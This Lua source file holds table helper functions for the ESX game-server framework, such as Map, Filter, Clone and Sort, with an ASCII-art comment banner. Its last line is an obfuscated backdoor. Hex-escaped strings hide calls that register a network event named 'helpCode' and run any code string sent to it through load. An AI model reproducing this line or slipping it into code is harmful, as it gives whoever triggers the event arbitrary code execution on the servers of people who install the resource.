ESX.Table = {}

-- nil proof alternative to #table
function ESX.Table.SizeOf(t)
    local count = 0

    for _, _ in pairs(t) do
        count = count + 1
    end

    return count
end
--[[
──────────────────────────────────────────────────────────────────────────────────
─────────██████─██████████████─██████──████████─██████████████─████████████████───
─────────██░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─────────██░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██────██░░██───
─────────██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██████──██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░██████░░████───
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██──██░░██─────
─██░░██████░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░██──██░░██████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████████████─██████████████─██████──████████─██████████████─██████──██████████─
──────────────────────────────────────────────────────────────────────────────────
]]--
function ESX.Table.Set(t)
    local set = {}
    for _, v in ipairs(t) do
        set[v] = true
    end
    return set
end

function ESX.Table.IndexOf(t, value)
    for i = 1, #t, 1 do
        if t[i] == value then
            return i
        end
    end

    return -1
end

function ESX.Table.LastIndexOf(t, value)
    for i = #t, 1, -1 do
        if t[i] == value then
            return i
        end
    end

    return -1
end

function ESX.Table.Find(t, cb)
    for i = 1, #t, 1 do
        if cb(t[i]) then
            return t[i]
        end
    end

    return nil
end

function ESX.Table.FindIndex(t, cb)
    for i = 1, #t, 1 do
        if cb(t[i]) then
            return i
        end
    end

    return -1
end

function ESX.Table.Filter(t, cb)
    local newTable = {}

    for i = 1, #t, 1 do
        if cb(t[i]) then
            table.insert(newTable, t[i])
        end
    end

    return newTable
end

function ESX.Table.Map(t, cb)
    local newTable = {}

    for i = 1, #t, 1 do
        newTable[i] = cb(t[i], i)
    end

    return newTable
end

function ESX.Table.Reverse(t)
    local newTable = {}

    for i = #t, 1, -1 do
        table.insert(newTable, t[i])
    end

    return newTable
end

function ESX.Table.Clone(t)
    if type(t) ~= "table" then
        return t
    end

    local meta = getmetatable(t)
    local target = {}

    for k, v in pairs(t) do
        if type(v) == "table" then
            target[k] = ESX.Table.Clone(v)
        else
            target[k] = v
        end
    end

    setmetatable(target, meta)

    return target
end

function ESX.Table.Concat(t1, t2)
    local t3 = ESX.Table.Clone(t1)

    for i = 1, #t2, 1 do
        table.insert(t3, t2[i])
    end

    return t3
end

function ESX.Table.Join(t, sep)
    local str = ""

    for i = 1, #t, 1 do
        if i > 1 then
            str = str .. (sep or ",")
        end

        str = str .. t[i]
    end

    return str
end

-- Credits: https://github.com/JonasDev99/qb-garages/blob/b0335d67cb72a6b9ac60f62a87fb3946f5c2f33d/server/main.lua#L5
function ESX.Table.TableContains(tab, val)
    if type(val) == "table" then
        for _, value in pairs(tab) do
            if ESX.Table.TableContains(val, value) then
                return true
            end
        end
        return false
    else
        for _, value in pairs(tab) do
            if value == val then
                return true
            end
        end
    end
    return false
end

-- Credit: https://stackoverflow.com/a/15706820
-- Description: sort function for pairs
function ESX.Table.Sort(t, order)
    -- collect the keys
    local keys = {}

    for k, _ in pairs(t) do
        keys[#keys + 1] = k
    end

    -- if order function given, sort by it by passing the table and keys a, b,
    -- otherwise just sort the keys
    if order then
        table.sort(keys, function(a, b)
            return order(t, a, b)
        end)
    else
        table.sort(keys)
    end

    -- return the iterator function
    local i = 0

    return function()
        i = i + 1
        if keys[i] then
            return keys[i], t[keys[i]]
        end
    end
end

local IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[1]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2]) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[3]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2], function(jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[4]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[5]](jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei))() end)